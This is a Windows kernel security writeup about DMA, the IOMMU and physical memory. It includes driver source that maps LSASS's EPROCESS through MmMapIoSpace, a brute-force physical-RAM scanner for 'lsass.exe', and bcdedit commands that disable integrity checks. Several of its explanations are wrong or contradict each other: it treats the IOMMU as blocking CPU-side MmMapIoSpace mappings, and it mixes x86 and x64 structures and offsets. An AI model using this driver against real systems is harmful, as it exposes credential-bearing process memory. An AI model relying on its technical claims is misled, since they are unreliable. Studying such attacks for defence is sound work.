---
title: "Physical Memory as the Ground Truth: DMA, IOMMU, and the Hardware Trust Boundary"
date: 2026-05-17
tags: [windows-kernel, dma, iommu, physical-memory, hardware-security, lpe, kernel-driver]
cluster: kernel-memory-model
related:
  - MDL-Abuse-Writeup
  - Qualcomm-Kgsl-SignExt-Writeup
  - rzpnk-Logic-Bugs-Writeup
---

## Author's Note

Every operating system sells the same promise: processes are isolated from each other, kernel memory is invisible to user-mode code, and hardware devices can only touch memory they are authorized to touch. This writeup examines what that promise is actually built on — and what layer sits below it.

The answer is physical memory. All of process isolation, all of kernel/user separation, all of virtual address space protections — these are abstractions maintained by the CPU's MMU. They are real and robust when viewed from within the CPU's execution model. But from outside that model, from the perspective of a DMA-capable hardware device on the PCIe bus, none of these abstractions exist. There is only a flat physical address space, and everything is in it.

The IOMMU was designed to extend the MMU's protection model to the hardware bus. This writeup is about what happens when it does not.

---

## Abstract

Modern x86 systems maintain memory isolation through two complementary hardware mechanisms: the CPU's Memory Management Unit (MMU), which enforces virtual address space boundaries during instruction execution, and the Input/Output Memory Management Unit (IOMMU), which enforces those same boundaries for Direct Memory Access (DMA) operations by peripheral devices. When IOMMU is absent or disabled, any PCIe device — and by extension, any Windows kernel driver using `MmMapIoSpace()` — can read or write arbitrary physical RAM with no access control whatsoever.

This writeup builds a kernel-mode driver that demonstrates this surface: it disables IOMMU enforcement, translates LSASS's virtual EPROCESS address to a physical address via CR3/page-table walk, and reads that physical memory directly via `MmMapIoSpace`. The exploit is not the interesting part. The interesting part is the architectural argument: **process isolation is a guarantee about CPU instruction execution, not about data confidentiality at the hardware bus level.** IOMMU patches this gap, but it is optional, configurable, and disabled by default in many environments.

---

## §1 — The Abstraction Stack and Where It Ends

A running process believes it owns an address space. When it reads from virtual address `0x7FFE0000`, the CPU consults the page table rooted at CR3, translates the virtual address to a physical address, and fetches bytes from DRAM. No other process can touch those pages because no other CR3 maps them.

This model is coherent and strong — from inside the CPU. The CPU is the enforcer. Every memory access during instruction execution passes through the MMU, and the MMU enforces the page table hierarchy.

The gap emerges when you ask: *who enforces access control for memory operations that do not go through the CPU?*

DMA is the answer. A network card receiving a packet writes it to RAM directly — without executing a single CPU instruction, without passing through any CR3, without consulting any page table. The CPU learns about the arrival afterward. Between the physical arrival of data at the memory bus and the CPU's awareness of it, the isolation model that processes trust has simply not existed.

```
[CPU Instruction Model]
  process A VA → CR3 → page table → physical address → DRAM
  process B VA → CR3 → (different page table) → (different physical address)
  ✓ Isolation enforced at every step

[DMA Model - no IOMMU]
  PCIe device → physical address → DRAM directly
  No CR3. No page table. No MMU.
  ✗ Zero isolation. Flat physical space. Everything readable.
```

The IOMMU is the hardware unit that inserts an equivalent of the MMU into the DMA path. It maintains a remapping table for each device, restricting which physical addresses each device can access. When enabled, a network card can only DMA into the pages it was authorized to use. When disabled — or absent — the physical address space is entirely open.

---

## §2 — The Windows IOMMU Surface

On Windows, IOMMU is surfaced through **Memory Integrity** (also called HVCI — Hypervisor Protected Code Integrity) under Device Security → Core Isolation. When Memory Integrity is enabled, Windows activates the IOMMU and enforces device isolation. When disabled (which is the default on most non-enterprise installations), IOMMU enforcement is off.

The precise system state can be verified via:

```
msinfo32 → System Summary → Device Guard → Memory Integrity: Enabled / Disabled
```

Or at the firmware level, by checking DMAR (DMA Remapping) tables in ACPI. If `DMAR` is absent or has no remapping scope covering the system, IOMMU is not active regardless of the OS setting.

Disabling IOMMU programmatically (requires admin):

```cmd
bcdedit /set hypervisorlaunchtype off
bcdedit /set nointegritychecks on
bcdedit /set testsigning on
shutdown /r /t 0
```

After reboot, the system runs without IOMMU enforcement. Any kernel driver can call `MmMapIoSpace()` with an arbitrary physical address and receive a valid virtual mapping into that physical page. The call cannot be distinguished from a legitimate I/O mapping.

---

## §3 — `MmMapIoSpace`: The Kernel's DMA Surface

`MmMapIoSpace` is the Windows kernel API for mapping physical addresses into kernel virtual address space. Its documented purpose is to allow drivers to access memory-mapped I/O registers of hardware devices. Its signature:

```c
PVOID MmMapIoSpace(
    PHYSICAL_ADDRESS    PhysicalAddress,
    SIZE_T              NumberOfBytes,
    MEMORY_CACHING_TYPE CacheType
);
```

The function takes a raw `PHYSICAL_ADDRESS` (a 64-bit integer) and returns a kernel virtual pointer. There is no access control on the physical address. If IOMMU is disabled, passing `0x7f126af8` — the physical address of LSASS's EPROCESS structure — returns a valid pointer into that structure. The OS has no mechanism to distinguish this from mapping a PCIe BAR register.

The caching type `MmNonCached` bypasses CPU caches and reads directly from DRAM, ensuring the freshest data from physical RAM without cache aliasing artifacts.

---

## §4 — Physical Address Resolution: CR3 → VA → PA

To read a specific structure from physical RAM, the physical address must be known. For `lsass.exe`'s EPROCESS structure, the translation proceeds as follows.

Every process has a unique CR3 value — the physical address of its top-level page directory (PML4 on x64). The kernel stores this in `EPROCESS.Pcb.DirectoryTableBase`. For LSASS, WinDbg gives:

```
!process 0 0 lsass.exe
  PROCESS 85926af8 ...
  DirBase: 271ed000  ObjectTable: ...
  Image: lsass.exe
```

With the CR3 (`0x271ed000`) and the virtual address of EPROCESS (`0x85926af8`), the physical address is derived by walking the page tables manually, or via:

```
!vtop 271ed000 85926af8
  Virtual address 85926af8 translates to physical address 7f126af8
```

The result: `0x7f126af8` is the physical address of LSASS's EPROCESS block in RAM at this moment. This is the address we pass to `MmMapIoSpace`.

---

## §5 — Kernel Driver Implementation

The driver follows the standard Windows kernel driver skeleton: `DriverEntry` registers dispatch routines, an IOCTL handler performs the physical read when triggered from user-mode.

### 5.1 Driver Skeleton

```c
#include <ntddk.h>

#define DEVICE_NAME  L"\\Device\\DMAReader"
#define SYMLINK_NAME L"\\DosDevices\\DMAReader"
#define IOCTL_DMA_READ_PHYS_MEM \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    UNICODE_STRING devName  = RTL_CONSTANT_STRING(DEVICE_NAME);
    UNICODE_STRING symLink  = RTL_CONSTANT_STRING(SYMLINK_NAME);
    PDEVICE_OBJECT DeviceObject = NULL;

    NTSTATUS status = IoCreateDevice(
        DriverObject, 0, &devName,
        FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
        FALSE, &DeviceObject);
    if (!NT_SUCCESS(status)) return status;

    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) { IoDeleteDevice(DeviceObject); return status; }

    DriverObject->MajorFunction[IRP_MJ_CREATE]         =
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = CreateCloseDispatch;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlDispatch;
    DriverObject->DriverUnload                         = UnloadDriver;

    return STATUS_SUCCESS;
}
```

`IoCreateDevice` + `IoCreateSymbolicLink` establishes the kernel object and the user-mode accessible path (`\\.\DMAReader`). The MajorFunction table wires IRP dispatch: `IRP_MJ_DEVICE_CONTROL` routes to the IOCTL handler where the physical read lives.

### 5.2 Physical Memory Read via IOCTL

```c
case IOCTL_DMA_READ_PHYS_MEM:
{
    PHYSICAL_ADDRESS physAddr;
    physAddr.QuadPart = 0x7f126af8;   // LSASS EPROCESS: derived from !vtop

    SIZE_T length = 0x100;            // 256 bytes — covers EPROCESS header
    PVOID mapped  = MmMapIoSpace(physAddr, length, MmNonCached);

    if (mapped) {
        PUCHAR p = (PUCHAR)mapped;

        // EPROCESS.ImageFileName sits at +0x174 (x86) / +0x450 (x64)
        // EPROCESS.Token         sits at +0x0f8 (x86)
        // EPROCESS.UniqueProcessId at +0x084 (x86)
        DbgPrint("ImageFileName: %.16s\n", p + 0x174);

        MmUnmapIoSpace(mapped, length);   // mandatory — prevents kernel VA leak
    }

    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
```

The flow in full:

```
[User-Mode]
    DeviceIoControl(hDevice, IOCTL_DMA_READ_PHYS_MEM, ...)
         ↓
[IRP Dispatch]
    DeviceControlDispatch → case IOCTL_DMA_READ_PHYS_MEM
         ↓
[MmMapIoSpace]
    Physical address 0x7f126af8 → Kernel VA mapping (bypasses MMU page tables)
         ↓
[Physical DRAM]
    Raw bytes of LSASS EPROCESS structure
         ↓
[DbgPrint]
    ImageFileName, Token pointer, PID, PEB pointer
```

Without IOMMU: `MmMapIoSpace` succeeds unconditionally. With IOMMU active: the call either returns `NULL` or triggers a fault, because the physical page is outside the driver's authorized remapping window.

### 5.3 Why `MmUnmapIoSpace` Is Non-Negotiable

`MmMapIoSpace` allocates a PTEs entry in the kernel's system address space. If `MmUnmapIoSpace` is not called, that PTE persists indefinitely — a kernel virtual address range leaks until system reboot. In a loop that reads many physical pages (e.g., a full physical RAM scan), omitting the unmap call exhausts the system address space and causes a non-paged pool exhaustion crash. This is not a security concern in a read-only research driver, but it is the difference between a stable and an unstable PoC.

---

## §6 — Physical RAM Scanning: Finding LSASS Without !vtop

In a scenario where the CR3 is not known in advance, the physical address of LSASS can be located by scanning physical RAM for the ASCII string `"lsass.exe"`. The EPROCESS structure contains `ImageFileName` as a 15-byte ASCII field at a fixed offset. A scan from the lower physical memory boundary finds it:

```c
PHYSICAL_ADDRESS scanStart;
scanStart.QuadPart = 0x01000000;    // start at 16 MB — below this is BIOS/UEFI territory
SIZE_T scanLen = 0x04000000;        // scan 64 MB

PVOID scanBase = MmMapIoSpace(scanStart, scanLen, MmNonCached);
if (!scanBase) return;

PUCHAR p = (PUCHAR)scanBase;
for (SIZE_T i = 0; i < scanLen - 16; i++) {
    if (RtlCompareMemory(p + i, "lsass.exe", 9) == 9) {
        DbgPrint("LSASS ImageFileName hit at PA: 0x%llx\n",
                 scanStart.QuadPart + i);
    }
}
MmUnmapIoSpace(scanBase, scanLen);
```

This is a brute-force physical memory search — the same technique used by PCILeech and hardware DMA attack platforms. It is slow (microseconds per page), noisy in debug output, and would BSOD on a system with IOMMU active. But it illustrates the core claim precisely: on an IOMMU-disabled system, the entire physical address space is a flat, readable array indexed from 0 to total RAM.

The EPROCESS `ImageFileName` field at x86 offset `+0x174` / x64 offset `+0x450` will appear verbatim, followed immediately by the Token pointer, the PEB pointer, and every other EPROCESS field — all without holding any kernel handle, acquiring any lock, or passing through any access check.

---

## §7 — The Formal Claim: What Isolation Guarantees and What It Does Not

The formal statement:

> **Process isolation in modern OS kernels is a predicate over CPU instruction execution, not over physical memory access.**

More precisely: the invariant that "process A cannot read process B's memory" holds *if and only if* every read from A executes through A's page tables. The moment a read bypasses the MMU — either via DMA, via `MmMapIoSpace`, or via a hardware device — the invariant has no enforcement mechanism.

IOMMU extends the invariant to DMA by inserting address translation and access control into the device-to-memory path:

```
Without IOMMU:
  Invariant domain = { CPU instruction reads/writes }
  DMA reads/writes ∉ Invariant domain → isolation does not hold for DMA

With IOMMU:
  Invariant domain = { CPU instruction reads/writes } ∪ { DMA via IOMMU-mapped windows }
  ∀ device d, ∀ physical address PA:
    d can access PA ↔ PA ∈ IOMMU_window(d)
  → isolation holds for authorized DMA regions
```

The Windows Memory Integrity / HVCI setting is the operator that expands the invariant domain to include DMA. When it is off, the domain shrinks back to CPU instruction execution only, and every DMA-capable device — or every kernel driver with `MmMapIoSpace` access — can violate process isolation without constraint.

This is the same architectural observation that motivates Thunderclap (2019, Cambridge/Rice/SRI): that IOMMU enforcement, where present, is bypassable through insufficient remapping scope configuration even on systems that believe IOMMU is active.

---

## §8 — Historical Context and Attack Platforms

**Thunderclap (2019):** Demonstrated that Thunderbolt devices presenting a PCIe interface could perform DMA attacks against Windows, macOS, and Linux even with IOMMU enabled, because OS IOMMU configurations granted overly broad DMA windows to Thunderbolt controllers. The attack bypassed FileVault (macOS), allowed kernel memory reads (Windows), and enabled credential extraction from RAM (Linux) — all via a malicious Thunderbolt device.

**PCILeech:** Open-source DMA attack framework using FPGA-based PCIe boards (Screamer, LeechBoard). Implements physical memory read/write via hardware DMA on IOMMU-disabled systems. The same `ImageFileName` string-hunting approach used in this writeup is a core PCILeech primitive.

**BadUSB / PCILeech Software Mode:** On systems where IOMMU is disabled, PCILeech can run in software mode via a kernel driver that calls `MmMapIoSpace` — exactly the pattern in this writeup's driver. No physical FPGA required. This collapses the hardware DMA attack into a pure software kernel driver.

---

## §9 — Mitigations and the IOMMU Gap

| Mitigation | What it protects | Gap |
|---|---|---|
| **IOMMU / Memory Integrity enabled** | DMA from PCIe devices restricted per device remapping table | Kernel drivers using `MmMapIoSpace` are still authorized — they operate within their own IOMMU window |
| **Signed driver enforcement (DSE)** | Prevents loading of unsigned kernel drivers | A signed but malicious driver (BYOVD) can still call `MmMapIoSpace` |
| **Secure Boot** | Prevents unsigned bootloaders/OS from loading | Does not prevent signed drivers from abusing physical memory APIs |
| **HVCI (full)** | Kernel code pages cannot be modified; driver integrity enforced | Does not restrict `MmMapIoSpace` calls by authorized drivers |

The residual gap: `MmMapIoSpace` is a documented API with legitimate use cases (mapping hardware MMIO registers). No kernel-level mechanism prevents a driver from passing an arbitrary system RAM address to it rather than a device BAR address. The OS has no way to distinguish `MmMapIoSpace(0xFF000000, ...)` (ACPI NVS region) from `MmMapIoSpace(0x7f126af8, ...)` (LSASS EPROCESS). Both succeed if the driver is loaded and IOMMU does not restrict the call.

---

## §10 — Related Writeups

This writeup occupies the hardware-software boundary layer of this collection's kernel memory model cluster:

**`MDL-Abuse-Writeup`** — MDL abuse (`IoAllocateMdl` + `MmBuildMdlForNonPagedPool` + `MmMapLockedPagesSpecifyCache`) is the software-internal version of this attack: the MDL API converts a virtual address to a physical page list and re-maps it, achieving read/write to arbitrary kernel memory without leaving the CPU execution model. DMA/IOMMU abuse is the hardware-external version: `MmMapIoSpace` accepts a raw physical address directly, bypassing even the virtual→physical translation step.

**`Qualcomm-Kgsl-SignExt-Writeup`** — The Qualcomm writeup examines a sign extension bug that causes arithmetic on physical-layer GPU memory offsets to produce wrong addresses, leading to OOB access in mapped physical regions. The shared theme: physical address arithmetic is unsigned 64-bit arithmetic, and every sign or wrap error in that domain has immediate physical memory consequences.

**`rzpnk-Logic-Bugs-Writeup`** — rzpnk demonstrates trust boundary failure at the user→kernel API surface. DMA/IOMMU demonstrates trust boundary failure at the hardware→kernel surface. Together they establish that trust boundaries in kernel systems are multi-layer: validating one layer (user input) does not validate others (DMA input, physical address input).

The common thread across all three: **isolation claims must be stated with respect to a specific enforcement domain. When the attack operates outside that domain, the claim does not apply.**

---

*Research context: educational analysis of the hardware-software trust boundary. All techniques require kernel-mode access and an IOMMU-disabled environment. Demonstrated on controlled test systems with Memory Integrity disabled.*
